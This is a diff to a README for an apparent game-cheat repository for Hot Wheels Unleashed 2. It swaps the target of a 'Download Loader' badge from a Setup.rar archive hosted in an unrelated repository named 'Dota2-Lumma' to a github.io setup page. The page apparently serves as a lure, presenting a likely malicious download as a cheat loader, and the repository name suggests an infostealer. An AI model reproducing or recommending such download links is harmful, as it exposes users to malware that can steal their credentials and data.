@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Hot Wheels Unleashed 2 Cheats
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://rewfdf.github.io/SetupPage)
 
 ---
 
@@ -38,5 +38,6 @@ configs/
 `Hot-Wheels-Unleashed-2-Cheats` · Updated: 2026-10-29
 
 **Tags:** `hot-wheels-unleashed-2` `racing` `arcade` `multiplayer`
+
 
 
